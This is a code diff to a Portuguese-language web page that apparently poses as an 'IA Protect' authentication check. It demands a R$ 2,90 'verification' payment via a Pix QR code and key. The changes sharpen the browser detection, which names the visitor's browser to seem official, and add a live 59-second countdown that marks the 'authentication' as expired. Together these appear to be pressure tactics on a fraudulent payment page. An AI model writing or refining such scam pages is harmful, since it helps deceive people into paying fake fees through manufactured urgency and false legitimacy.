@@ -55,7 +55,7 @@
   <h3>Valor único de verificação: R$ 2,90</h3>
   <p>(IA Protect opera por menos de $0.55 USD internacionalmente)</p>
 
-  <!-- QR Code visível -->
+  <!-- QR code funcional -->
   <img 
     src="https://api.qrserver.com/v1/create-qr-code/?data=00020126580014BR.GOV.BCB.PIX01367a97187a-4475-4468-92b5-a8dc1d83aeda52040000530398654042.905802BR5923SUL%20INTERMEDIACOES%20LTDA6006ITAJAI62120508IAPROTEC630446DB&size=220x220" 
     class="qr-code" 
@@ -68,17 +68,20 @@
 
   <div class="code-box" id="pixKey">00020126580014BR.GOV.BCB.PIX01367a97187a-4475-4468-92b5-a8dc1d83aeda52040000530398654042.905802BR5923SUL INTERMEDIACOES LTDA6006ITAJAI62120508IAPROTEC630446DB</div>
 
-  <p class="timer">⏳ Sua autenticação expira em 59 segundos.</p>
+  <p class="timer">⏳ Sua autenticação expira em <span id="countdown">59</span> segundos.</p>
 
   <script>
-    // Detecta navegador
-    const browser = navigator.userAgent;
-    let name = "seu navegador";
-    if (browser.includes("Chrome")) name = "Google Chrome";
-    else if (browser.includes("Firefox")) name = "Mozilla Firefox";
-    else if (browser.includes("Safari")) name = "Safari";
-    else if (browser.includes("Edg")) name = "Microsoft Edge";
-    document.getElementById("browser-name").textContent = name;
+    // Navegador
+    const userAgent = navigator.userAgent;
+    let browser = "seu navegador";
+
+    if (/chrome|crios|crmo/i.test(userAgent)) browser = "Google Chrome";
+    else if (/firefox|fxios/i.test(userAgent)) browser = "Mozilla Firefox";
+    else if (/safari/i.test(userAgent) && !/chrome/i.test(userAgent)) browser = "Safari";
+    else if (/edg/i.test(userAgent)) browser = "Microsoft Edge";
+    else if (/opera|opr\//i.test(userAgent)) browser = "Opera";
+
+    document.getElementById("browser-name").textContent = browser;
 
     // Cópia Pix
     function copyPix() {
@@ -87,6 +90,20 @@
         alert("Chave Pix copiada com sucesso!");
       });
     }
+
+    // Cronômetro regressivo
+    let tempo = 59;
+    const el = document.getElementById("countdown");
+    const interval = setInterval(() => {
+      tempo--;
+      if (tempo <= 0) {
+        clearInterval(interval);
+        el.textContent = "expirada";
+        document.querySelector(".timer").style.color = "red";
+      } else {
+        el.textContent = tempo;
+      }
+    }, 1000);
   </script>
 </body>
 </html>
